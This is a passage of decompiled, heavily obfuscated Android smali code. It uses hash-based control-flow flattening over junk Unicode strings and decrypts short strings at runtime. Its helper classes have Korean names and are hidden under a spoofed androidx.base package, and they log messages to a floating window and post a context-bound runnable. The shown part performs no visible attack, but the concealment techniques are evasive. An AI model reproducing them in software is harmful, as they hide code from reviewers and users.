    const-string v1, "\u06db\u06e7\u06eb\u06ec\u06df\u06e8\u06d8\u06da\u06df\u06d6\u06d8\u06da\u06d7\u06e5\u06d8\u06e6\u06e8\u06d7\u06e2\u06db\u06e6\u06e6\u06da\u06dc\u06e5\u06ec\u06e6\u06e8\u06eb\u06eb\u06e4\u06dc\u06e2\u06e8\u06eb\u06dc\u06d8\u06eb\u06d7\u06da\u06e4\u06ec\u06e6\u06d9\u06d9\u06ec\u06db\u06d7\u06e6\u06d8\u06e8\u06e2\u06e1\u06d8\u06d7\u06eb\u06e5\u06dc\u06e6\u06db"

    goto :goto_16

    :sswitch_49
    const/4 v1, 0x1

    if-ne v8, v1, :cond_a

    const-string v1, "\u06d6\u06d6\u06e2\u06e6\u06dc\u06da\u06e0\u06d8\u06e4\u06e1\u06db\u06ec\u06dc\u06e0\u06e6\u06d8\u06e8\u06e8\u06e1\u06ec\u06d6\u06e8\u06d8\u06d8\u06e5\u06e0\u06e7\u06dc\u06e6\u06e8\u06ec\u06dc\u06db\u06df\u06eb\u06d6\u06d6\u06d8\u06ec\u06d9\u06dc\u06d9\u06eb\u06e7\u06d8\u06d9\u06e5\u06d7\u06d7\u06e8\u06d8\u06eb\u06d7\u06df\u06db\u06e4"

    goto :goto_16

    :sswitch_4a
    const-string v1, "\u06d8\u06e4\u06d6\u06d8\u06eb\u06e5\u06eb\u06e1\u06d7\u06df\u06db\u06e5\u06da\u06e7\u06e7\u06d6\u06d8\u06ec\u06d7\u06e5\u06d8\u06dc\u06d8\u06d8\u06db\u06d8\u06e0\u06e7\u06e6\u06d9\u06d7\u06e5\u06dc"

    goto :goto_16

    :sswitch_4b
    const-string v1, "\u06df\u06e2\u06e8\u06df\u06e4\u06d6\u06e1\u06e4\u06dc\u06e4\u06ec\u06d7\u06d7\u06dc\u06eb\u06d6\u06e8\u06d6\u06d8\u06db\u06df\u06dc\u06d8\u06dc\u06e1\u06d9\u06da\u06e2\u06d8\u06d8\u06e8\u06d8\u06e8\u06ec\u06d7\u06e8\u06d8\u06e1\u06d7\u06ec\u06db\u06d8\u06d9\u06e1\u06d8\u06df\u06e1\u06e4\u06e6\u06d8\u06e1\u06e6\u06e4"

    goto :goto_15

    :sswitch_4c
    const v8, 0x6c77fc19

    const-string v1, "\u06eb\u06e4\u06d8\u06d8\u06d9\u06df\u06df\u06e1\u06da\u06db\u06e1\u06d7\u06df\u06df\u06e7\u06e8\u06d8\u06dc\u06db\u06e5\u06d8\u06e5\u06e7\u06d8\u06d6\u06e2\u06d8\u06db\u06e8\u06e8\u06d9\u06df\u06e1\u06eb\u06e5\u06ec\u06e8\u06dc\u06e7\u06d8\u06d9\u06e5\u06df\u06da\u06eb\u06e4\u06e8\u06e1\u06e8\u06d9\u06dc\u06d8"

    :goto_18
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_16

    goto :goto_18

    :sswitch_4d
    const-string v1, "\u06e8\u06d7\u06e8\u06d8\u06d7\u06e1\u06d9\u06e5\u06e6\u06dc\u06d8\u06e6\u06e0\u06d7\u06e7\u06e6\u06d7\u06e4\u06e6\u06ec\u06d6\u06eb\u06e7\u06e1\u06e5\u06d8\u06e5\u06e5\u06db\u06da\u06da\u06df\u06e5\u06df\u06eb\u06df\u06ec\u06eb\u06e4\u06eb\u06d6\u06dc\u06e5\u06d8\u06d9\u06e6\u06df\u06df\u06df\u06db\u06dc\u06d7\u06e0\u06e4\u06d9\u06d8"

    goto :goto_18

    :sswitch_4e
    const-string v1, "\u06e8\u06d9\u06d7\u06e2\u06da\u06e1\u06e8\u06e7\u06d8\u06e7\u06eb\u06e6\u06d8\u06db\u06dc\u06eb\u06db\u06e7\u06da\u06e5\u06db\u06e2\u06e7\u06e0\u06e6\u06e0\u06df\u06d8\u06e8\u06d6\u06ec"

    goto :goto_18

    :sswitch_4f
    const v11, -0x42e62a40

    const-string v1, "\u06da\u06e0\u06e6\u06d8\u06e6\u06d8\u06eb\u06e0\u06d8\u06e0\u06e0\u06eb\u06e6\u06d8\u06e8\u06e0\u06e7\u06d8\u06e4\u06e0\u06e4\u06d8\u06e8\u06d8\u06db\u06e8\u06d6\u06d8\u06e8\u06e4\u06e1\u06d8\u06e8\u06d7\u06dc\u06d8\u06d7\u06e5\u06d8\u06da\u06eb\u06e8\u06d8"

    :goto_19
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_17

    goto :goto_19

    :sswitch_50
    const-string v1, "\u06df\u06ec\u06eb\u06e7\u06eb\u06eb\u06d6\u06e6\u06e8\u06d8\u06eb\u06d8\u06e0\u06e0\u06d9\u06d8\u06eb\u06e6\u06d8\u06dc\u06dc\u06d6\u06d8\u06e7\u06d8\u06e0\u06da\u06d7\u06e6\u06d8\u06e5\u06d6\u06d8\u06d6\u06db\u06e6\u06e6\u06e2\u06e6"

    goto :goto_18

    :cond_b
    const-string v1, "\u06e2\u06df\u06d8\u06eb\u06dc\u06e1\u06d8\u06d9\u06df\u06d6\u06d8\u06eb\u06ec\u06d6\u06d8\u06e8\u06e1\u06e7\u06d8\u06e8\u06e8\u06ec\u06e5\u06d9\u06dc\u06d8\u06df\u06e7\u06d6\u06db\u06da\u06d8\u06e8\u06df\u06e4\u06df\u06e1\u06e5\u06d9\u06d8\u06dc\u06d8\u06db\u06e5\u06d6\u06e5\u06eb\u06dc\u06db\u06e2\u06eb\u06db\u06e5"

    goto :goto_19

    :sswitch_51
    if-nez v0, :cond_b

    const-string v1, "\u06d9\u06dc\u06e2\u06e1\u06eb\u06df\u06d9\u06e5\u06dc\u06d8\u06e0\u06e1\u06d9\u06db\u06d9\u06e1\u06eb\u06e1\u06e5\u06e2\u06da\u06ec\u06e4\u06e6\u06df\u06d9\u06df\u06e6\u06d8\u06d7\u06d7\u06e1\u06d8\u06e2\u06d8\u06dc\u06d8\u06da\u06e2\u06e4\u06e0\u06d7\u06ec\u06d9\u06e8\u06e4"

    goto :goto_19

    :sswitch_52
    const-string v1, "\u06e0\u06ec\u06d8\u06d8\u06eb\u06e0\u06df\u06eb\u06e8\u06d9\u06e8\u06d6\u06e0\u06db\u06db\u06da\u06d8\u06e1\u06e0\u06d9\u06e1\u06d6\u06db\u06d8\u06d7\u06d6\u06d9\u06e7\u06e5\u06e5\u06e1\u06d8\u06db\u06d6\u06e1\u06df\u06e2\u06e8\u06e6\u06e6\u06ec\u06e6\u06e8\u06e2\u06e5\u06e6\u06e8\u06e6\u06dc\u06d8\u06ec\u06ec\u06eb\u06da\u06d7"

    goto :goto_19

    :sswitch_53
    const v1, -0x718a2420

    const-string v0, "\u06e1\u06e1\u06eb\u06e0\u06e5\u06e5\u06db\u06d8\u06d9\u06d6\u06da\u06d7\u06d7\u06e4\u06e1\u06d8\u06e2\u06e0\u06e8\u06d8\u06e2\u06e1\u06e4\u06d7\u06e4\u06e0\u06e5\u06df\u06e8\u06d8\u06d8\u06e8\u06d8"

    :goto_1a
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_18

    goto :goto_1a

    :sswitch_54
    const-string v0, "\u06da\u06db\u06df\u06e2\u06d6\u06dc\u06d8\u06df\u06df\u06d8\u06d8\u06d6\u06e1\u06e7\u06d8\u06d6\u06e8\u06db\u06d8\u06d6\u06e1\u06d8\u06e1\u06da\u06e6\u06d8\u06db\u06d6\u06e7\u06d8\u06dc\u06e5\u06e4\u06e2\u06e4\u06d6\u06d8\u06d8\u06d8\u06eb\u06e5\u06d8\u06e2\u06d9\u06e0\u06ec\u06e7\u06dc\u06df"

    goto :goto_1a

    :sswitch_55
    const-string v0, "\u06dc\u06d7\u06eb\u06d7\u06d7\u06e0\u06e8\u06db\u06e2\u06d8\u06e5\u06e4\u06d6\u06e6\u06d8\u06e5\u06e0\u06da\u06e4\u06e7\u06d8\u06d8\u06e0\u06e7\u06e0\u06e1\u06e0\u06e1\u06dc\u06e5\u06e5\u06d8\u06d7\u06eb\u06e1\u06df\u06e6\u06dc\u06dc\u06e6\u06df\u06e6\u06ec\u06d8\u06d8\u06da\u06e1\u06e1\u06d8\u06e6\u06e5\u06dc\u06d8"

    goto :goto_1a

    :sswitch_56
    const v8, -0x67cbf21d

    const-string v0, "\u06e6\u06e1\u06da\u06e2\u06d8\u06ec\u06e6\u06dc\u06e0\u06e8\u06d9\u06ec\u06d6\u06e8\u06e2\u06e6\u06e4\u06e1\u06e5\u06eb\u06e5\u06ec\u06e8\u06dc\u06d8\u06e0\u06ec\u06ec\u06db\u06e0\u06e2\u06e8\u06d6\u06eb\u06d6\u06e5\u06e8"

    :goto_1b
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_19

    goto :goto_1b

    :sswitch_57
    const-string v0, "\u06e4\u06e5\u06dc\u06d8\u06eb\u06e5\u06e7\u06e0\u06e4\u06e8\u06da\u06e1\u06d9\u06d7\u06d9\u06e6\u06d6\u06e8\u06d9\u06d6\u06eb\u06ec\u06dc\u06df\u06da\u06db\u06e0\u06d6\u06e2\u06e2\u06d6\u06e8\u06ec\u06e7\u06e8\u06db\u06d7"

    goto :goto_1b

    :cond_c
    const-string v0, "\u06e0\u06db\u06db\u06dc\u06e8\u06e4\u06da\u06e8\u06ec\u06e4\u06e7\u06d8\u06d8\u06da\u06e5\u06da\u06e8\u06ec\u06e0\u06db\u06e6\u06d9\u06da\u06d7\u06e8\u06d8\u06d8\u06d8\u06e5\u06e5\u06db\u06d7\u06e8\u06e8\u06d8\u06da\u06dc\u06e5\u06ec\u06e1\u06e2\u06e0\u06d9\u06df\u06e2\u06dc\u06ec\u06d8\u06dc\u06d6\u06e2\u06e8\u06d8\u06ec\u06d8\u06d6\u06d8"

    goto :goto_1b

    :sswitch_58
    if-eqz v9, :cond_c

    const-string v0, "\u06d7\u06d9\u06d8\u06e6\u06e7\u06e5\u06df\u06d9\u06ec\u06d6\u06e1\u06dc\u06d8\u06da\u06db\u06e1\u06da\u06e5\u06e6\u06d6\u06e8\u06e7\u06da\u06e6\u06e7\u06ec\u06e0\u06dc\u06e4\u06d8\u06dc\u06d8\u06db\u06e0\u06d6\u06e1\u06e1\u06da"

    goto :goto_1b

    :sswitch_59
    const-string v0, "\u06e1\u06d6\u06ec\u06e0\u06e2\u06ec\u06dc\u06e4\u06e8\u06e8\u06e8\u06e4\u06d7\u06dc\u06e8\u06d8\u06dc\u06e0\u06dc\u06e4\u06d6\u06da\u06e0\u06e0\u06ec\u06e8\u06dc\u06e1\u06d8\u06e5\u06e6\u06d6\u06d8\u06e7\u06d6\u06e0\u06d7\u06d6\u06da\u06dc\u06e2\u06dc\u06d8\u06d6\u06e4\u06e5"

    goto :goto_1a

    :sswitch_5a
    const v1, 0x3298877f

    const-string v0, "\u06e4\u06d7\u06eb\u06e7\u06eb\u06d6\u06e4\u06e5\u06ec\u06da\u06e8\u06da\u06dc\u06ec\u06d8\u06d8\u06e4\u06dc\u06db\u06e5\u06d8\u06e1\u06d8\u06d7\u06e2\u06d9\u06eb\u06e8\u06e1\u06d8\u06df\u06d6\u06e5\u06e2\u06e2\u06dc\u06d8\u06d7\u06e0\u06dc"

    :goto_1c
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_1a

    goto :goto_1c

    :sswitch_5b
    const-string v0, "\u06d8\u06e5\u06e5\u06d8\u06db\u06d7\u06e7\u06eb\u06e6\u06e5\u06d9\u06d6\u06e8\u06db\u06e2\u06e1\u06e4\u06e1\u06e6\u06d8\u06d8\u06e0\u06d6\u06d7\u06d9\u06e1\u06eb\u06d7\u06e5\u06e5\u06e1\u06eb\u06d9\u06e5\u06e7\u06e1\u06d8\u06e1\u06ec\u06d8\u06eb\u06df\u06e5"

    goto :goto_1c

    :sswitch_5c
    const-string v0, "\u06d9\u06d6\u06ec\u06e1\u06e7\u06e2\u06e6\u06df\u06e1\u06d8\u06e1\u06e5\u06dc\u06d8\u06db\u06d9\u06d6\u06e6\u06e5\u06e7\u06d8\u06e6\u06e1\u06d7\u06e6\u06e1\u06d6\u06d8\u06e4\u06e4\u06d7\u06dc\u06d7\u06da\u06e8\u06d8\u06d6\u06df\u06dc\u06e7\u06d8"

    goto :goto_1c

    :sswitch_5d
    const v8, -0x2b9cfdc2    # -3.8999808E12f

    const-string v0, "\u06df\u06dc\u06d7\u06e1\u06e7\u06db\u06d6\u06da\u06e4\u06e4\u06e7\u06e1\u06d8\u06dc\u06e8\u06ec\u06e6\u06da\u06e1\u06e7\u06d7\u06d6\u06d8\u06eb\u06e4\u06e6\u06d8\u06e4\u06db\u06e0\u06d7\u06e6\u06e2\u06dc\u06df\u06e8\u06d8\u06db\u06e6\u06d6\u06d8\u06e1\u06eb\u06eb\u06e1\u06e1\u06da\u06e4\u06da\u06e1\u06d8\u06d7\u06e1\u06d8\u06d8\u06e7\u06eb\u06e1\u06d7\u06e1\u06e1"

    :goto_1d
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_1b

    goto :goto_1d

    :sswitch_5e
    const/4 v0, 0x1

    if-eq v9, v0, :cond_d

    const-string v0, "\u06e5\u06e1\u06d6\u06d8\u06da\u06d9\u06e1\u06d7\u06df\u06ec\u06db\u06e4\u06d8\u06d6\u06e2\u06ec\u06ec\u06d7\u06e7\u06d8\u06e0\u06e7\u06e5\u06db\u06d7\u06dc\u06d8\u06ec\u06d8\u06e8\u06d8\u06db\u06df\u06e1\u06e2\u06da\u06eb\u06dc\u06e5\u06eb\u06d6\u06e5\u06d8\u06ec\u06e0\u06df\u06d7\u06ec\u06e1"

    goto :goto_1d

    :cond_d
    const-string v0, "\u06e5\u06e8\u06e4\u06d7\u06e4\u06ec\u06db\u06df\u06e5\u06d8\u06e7\u06eb\u06e7\u06d6\u06d7\u06dc\u06e8\u06e7\u06e0\u06e0\u06dc\u06eb\u06e8\u06eb\u06d6\u06d8\u06e0\u06d8\u06d6\u06d8\u06e4\u06e0\u06e1\u06d8\u06e2\u06e8\u06da\u06e0\u06da\u06e6\u06d8\u06e0\u06e8\u06df\u06e1\u06e7\u06ec\u06df\u06e1\u06e1\u06d8\u06e8\u06eb\u06e8\u06d8\u06df\u06e5\u06dc\u06df\u06e5\u06dc"

    goto :goto_1d

    :sswitch_5f
    const-string v0, "\u06d6\u06e2\u06e2\u06e7\u06e8\u06db\u06e5\u06d9\u06e2\u06e5\u06e4\u06e6\u06d8\u06d9\u06db\u06d9\u06e7\u06d6\u06e8\u06d7\u06dc\u06db\u06e1\u06e2\u06e7\u06d9\u06e6\u06e0\u06dc\u06e2\u06d6\u06d8\u06e4\u06da\u06e2\u06e2\u06ec\u06e5\u06ec\u06d8\u06d8\u06e5\u06e8\u06e7\u06e4\u06d9\u06e5\u06d8\u06dc\u06e1\u06e8"

    goto :goto_1d

    :sswitch_60
    const-string v0, "\u06da\u06e6\u06dc\u06db\u06d7\u06e6\u06d8\u06df\u06ec\u06e7\u06d7\u06db\u06e0\u06ec\u06e6\u06d8\u06d7\u06e8\u06e4\u06e4\u06d8\u06eb\u06e7\u06e0\u06e5\u06e0\u06df\u06df\u06d7\u06e1\u06d8"

    goto :goto_1c

    :sswitch_61
    const v1, -0x6f56973e

    const-string v0, "\u06db\u06d9\u06ec\u06eb\u06d6\u06d6\u06d8\u06d7\u06d7\u06db\u06e5\u06e8\u06d8\u06d8\u06d7\u06e8\u06db\u06e0\u06dc\u06e2\u06d8\u06e8\u06e0\u06da\u06d8\u06d9\u06e7\u06e1\u06d8\u06d6\u06ec\u06d8\u06d8\u06df\u06e7\u06da\u06da\u06e1\u06e0"

    :goto_1e
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_1c

    goto :goto_1e

    :sswitch_62
    const v1, 0x3dd1faab

    const-string v0, "\u06d7\u06e5\u06e6\u06d8\u06e7\u06e7\u06e1\u06d9\u06e0\u06e6\u06d8\u06db\u06e6\u06ec\u06e5\u06d7\u06df\u06eb\u06e8\u06d6\u06e7\u06e7\u06d9\u06eb\u06eb\u06d7\u06e4\u06d6\u06e2\u06eb\u06e1\u06e0\u06df\u06d6\u06e1\u06d8\u06e4\u06e6\u06d8"

    :goto_1f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_1d

    goto :goto_1f

    :sswitch_63
    const v8, -0x76b2f300

    const-string v0, "\u06d9\u06db\u06e5\u06d6\u06d9\u06dc\u06ec\u06d6\u06e8\u06d8\u06dc\u06e0\u06e8\u06d8\u06e1\u06da\u06dc\u06e7\u06e4\u06e5\u06e2\u06e5\u06d8\u06d8\u06e1\u06e5\u06da\u06d6\u06d9\u06db\u06e8\u06db\u06d7\u06df\u06d8\u06e6\u06e6\u06e6\u06d7\u06e6\u06df\u06e4\u06e8\u06ec\u06dc\u06e8\u06e2\u06d9\u06db\u06e6\u06e6\u06d8"

    :goto_20
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_1e

    goto :goto_20

    :sswitch_64
    const-string v0, "\u06d8\u06e8\u06e7\u06ec\u06d9\u06dc\u06e8\u06d6\u06e4\u06e1\u06e8\u06da\u06dc\u06da\u06dc\u06d8\u06dc\u06db\u06e0\u06d6\u06e0\u06e5\u06d8\u06da\u06ec\u06d8\u06eb\u06eb\u06e0\u06e4\u06d9\u06d7\u06d6\u06e1\u06da\u06d8\u06d7\u06da\u06dc\u06eb\u06db\u06d9\u06d8\u06d6\u06eb\u06ec\u06d6\u06d8\u06eb\u06da\u06e5"

    goto :goto_20

    :sswitch_65
    const-string v0, "\u06e0\u06e5\u06dc\u06d8\u06df\u06e1\u06e7\u06e1\u06e4\u06e7\u06d9\u06e5\u06dc\u06d8\u06e2\u06e1\u06e7\u06db\u06d9\u06d8\u06d8\u06e0\u06e0\u06db\u06da\u06d8\u06dc\u06d8\u06d6\u06d8\u06e8\u06d8\u06d8\u06ec\u06e5\u06d8\u06e2\u06e4\u06e6\u06d8\u06d6\u06d6\u06d8\u06e0\u06e2\u06e2\u06d6\u06e0\u06ec\u06e1\u06e4\u06e8\u06d8\u06df\u06d9\u06e6\u06d8\u06e1\u06e1\u06dc\u06e2\u06e5\u06d8"

    goto :goto_1e

    :sswitch_66
    const v8, 0x2bf7abe6

    const-string v0, "\u06d8\u06e2\u06d8\u06dc\u06db\u06d6\u06df\u06e5\u06e5\u06d8\u06da\u06e7\u06e0\u06e4\u06e7\u06df\u06e2\u06da\u06e0\u06e8\u06e6\u06e1\u06e4\u06e7\u06e1\u06df\u06d9\u06e1\u06e0\u06e2\u06e6\u06e0\u06e4\u06e7\u06ec\u06e0\u06d8\u06db\u06e6\u06d8\u06dc\u06e7\u06ec\u06dc\u06d8\u06ec\u06ec\u06e7\u06e8\u06e4\u06ec\u06db\u06d8\u06da\u06dc\u06d8"

    :goto_21
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_1f

    goto :goto_21

    :sswitch_67
    const-string v0, "\u06e8\u06d7\u06e6\u06db\u06d8\u06e8\u06df\u06db\u06da\u06dc\u06e0\u06e2\u06e6\u06dc\u06d9\u06e4\u06ec\u06df\u06e5\u06da\u06e8\u06d9\u06d8\u06db\u06e2\u06dc\u06da\u06e5\u06e7\u06d9\u06d6\u06db\u06e7\u06e5\u06eb\u06d7\u06e0\u06e8\u06e4\u06e7\u06e4"

    goto :goto_21

    :cond_e
    const-string v0, "\u06e5\u06e7\u06e6\u06e0\u06e1\u06e5\u06d8\u06eb\u06eb\u06e2\u06ec\u06e0\u06e1\u06e7\u06df\u06e2\u06db\u06e6\u06eb\u06df\u06e5\u06e7\u06e2\u06e6\u06d8\u06e5\u06e6\u06d7\u06df\u06e1\u06da\u06ec\u06eb\u06e1\u06dc\u06e8\u06eb\u06d9\u06e2\u06db\u06e0\u06ec\u06e6\u06e2\u06e7\u06e5\u06da\u06d9\u06dc\u06dc\u06e1\u06e5\u06d8\u06e0\u06e4\u06e4"

    goto :goto_21

    :sswitch_68
    const/4 v0, 0x2

    if-eq v9, v0, :cond_e

    const-string v0, "\u06ec\u06d7\u06e6\u06d8\u06dc\u06d8\u06d6\u06d7\u06eb\u06e4\u06d8\u06d8\u06d8\u06d7\u06db\u06da\u06e4\u06e4\u06d8\u06e0\u06ec\u06d6\u06d8\u06d7\u06e0\u06df\u06e0\u06d7\u06e4\u06eb\u06e2\u06dc\u06db\u06dc\u06db\u06db\u06d9\u06ec\u06da\u06d8\u06d8\u06e7\u06e4\u06da\u06ec\u06d6\u06d8\u06db\u06e1\u06dc\u06d9\u06d8\u06d6\u06dc\u06e4\u06e7"

    goto :goto_21

    :sswitch_69
    const-string v0, "\u06e6\u06db\u06da\u06e0\u06e7\u06e1\u06dc\u06e1\u06e5\u06d8\u06e0\u06e5\u06e8\u06dc\u06e0\u06d6\u06e5\u06e0\u06e7\u06e6\u06e1\u06dc\u06d8\u06e5\u06df\u06ec\u06e4\u06e0\u06ec\u06d6\u06ec\u06e2\u06db\u06e7\u06eb\u06e4\u06e6\u06e6\u06d8\u06df\u06db\u06e6\u06e0"

    goto :goto_1e

    :sswitch_6a
    const-string v0, "\u06d8\u06e5\u06d8\u06e2\u06df\u06da\u06e8\u06e4\u06e8\u06dc\u06d7\u06e2\u06d7\u06e5\u06e6\u06df\u06db\u06df\u06e7\u06ec\u06d7\u06d9\u06db\u06e2\u06e5\u06df\u06e8\u06d8\u06da\u06d7\u06e4\u06da\u06d6\u06d6\u06d8\u06e0\u06e6\u06d6\u06d8\u06df\u06ec\u06d7\u06d9\u06e5\u06e8\u06d6\u06e0\u06e8\u06dc\u06e4\u06d8\u06d8\u06e2\u06dc\u06e5\u06ec\u06d7\u06eb"

    goto :goto_1e

    :sswitch_6b
    const-string v0, "\u06e7\u06eb\u06e5\u06d8\u06e8\u06ec\u06dc\u06eb\u06ec\u06dc\u06e2\u06d7\u06e8\u06e5\u06dc\u06da\u06da\u06e5\u06e7\u06d8\u06e1\u06e7\u06e1\u06ec\u06e5\u06e7\u06eb\u06e6\u06e7\u06db\u06dc\u06dc\u06d8\u06dc\u06d9\u06e5\u06eb\u06d9\u06e1\u06e2\u06e5\u06e8\u06e5\u06d8\u06e2\u06db\u06e7\u06d9\u06d8\u06ec\u06e5\u06d8"

    goto :goto_1f

    :cond_f
    const-string v0, "\u06e8\u06e4\u06dc\u06d6\u06e2\u06dc\u06d8\u06e7\u06e7\u06d9\u06d9\u06dc\u06e7\u06d8\u06df\u06df\u06ec\u06d9\u06db\u06d8\u06db\u06e0\u06dc\u06e1\u06e7\u06eb\u06e1\u06d9\u06e4\u06e1\u06ec\u06ec\u06e0\u06e4\u06dc\u06e1\u06e6\u06e5\u06d8\u06d8\u06e0\u06e5\u06d8\u06d8\u06e5\u06d7\u06dc\u06e4\u06e0\u06dc\u06e6\u06e5"

    goto :goto_20

    :sswitch_6c
    const/4 v0, 0x3

    if-eq v9, v0, :cond_f

    const-string v0, "\u06e8\u06eb\u06ec\u06d7\u06da\u06e7\u06da\u06da\u06e8\u06d8\u06e6\u06e4\u06e6\u06e5\u06db\u06e6\u06e8\u06e7\u06ec\u06e2\u06e1\u06d6\u06da\u06ec\u06dc\u06d8\u06d7\u06ec\u06d8\u06d6\u06ec\u06db\u06dc\u06df\u06e1\u06db\u06db\u06ec\u06e7\u06db\u06df\u06d8\u06d8\u06df\u06dc\u06dc\u06d8\u06da\u06e1\u06db"

    goto :goto_20

    :sswitch_6d
    const-string v0, "\u06eb\u06df\u06e5\u06d8\u06d8\u06e0\u06e7\u06e8\u06d7\u06e0\u06e1\u06d7\u06d9\u06e6\u06ec\u06e0\u06e7\u06df\u06e8\u06d8\u06e5\u06db\u06dc\u06d9\u06e7\u06e1\u06ec\u06ec\u06e4\u06e8\u06e2\u06dc\u06d8\u06e8\u06d8\u06e7\u06d8\u06df\u06e0\u06d8\u06e6\u06e4\u06e5\u06d8\u06d8\u06e1\u06e7\u06d6\u06d6\u06e7\u06d8\u06dc\u06e1\u06d7"

    goto :goto_1f

    :sswitch_6e
    const-string v0, "\u06e5\u06db\u06e6\u06d8\u06ec\u06e1\u06d6\u06e0\u06dc\u06d6\u06e2\u06e8\u06e6\u06da\u06d8\u06d8\u06d8\u06e8\u06e8\u06d8\u06d8\u06ec\u06e5\u06d6\u06df\u06d6\u06d8\u06e1\u06e0\u06df\u06e5\u06ec\u06e6\u06d8\u06d7\u06eb\u06e2\u06e6\u06d6\u06e8\u06d8\u06e2\u06eb\u06d7\u06e5\u06e7\u06db\u06da\u06e8\u06e2\u06d6\u06e5\u06d8\u06e2\u06d7\u06e0\u06d6\u06e5\u06ec"

    goto :goto_1f

    :sswitch_6f
    :try_start_7
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "6Bl5faWZ1BJRZGUB+Ltsqj97IH7N0d3yV0ZoAfyu\n"

    const-string v2, "s/7F7kA0TE8=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "WfN+6SGzvTsMqX2ceq7iWQ/5FbcO7MUj\n"

    const-string v2, "tk/yDJ0KWLw=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "ueI+a58=\n"

    const-string v2, "3JBMBO1Xlik=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Landroidx/base/전송;

    const/4 v2, 0x1

    invoke-direct {v1, v2, p0, v10}, Landroidx/base/전송;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Landroidx/base/처리;

    const/4 v2, 0x2

    invoke-direct {v1, v2}, Landroidx/base/처리;-><init>(I)V

    const-wide/16 v2, 0x5dc

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :goto_22
    return-void

    :sswitch_70
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "XGl9W/94csrlFGEnolrKcosLJFiXMHsq4zZsJ6ZP\n"

    const-string v8, "B47ByBrV6pc=\n"

    invoke-static {v1, v8}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "Y37pQppO1JQ2JOo3wVOL\n"

    const-string v7, "jMJlpyb3MRM=\n"

    invoke-static {v1, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "K2/NIac=\n"

    const-string v7, "Th2/TtWmIf4=\n"

    invoke-static {v1, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Landroidx/base/전송;

    const/4 v7, 0x0

    invoke-direct {v1, v7, p0, v10}, Landroidx/base/전송;-><init>(ILandroid/content/Context;Ljava/lang/String;)V

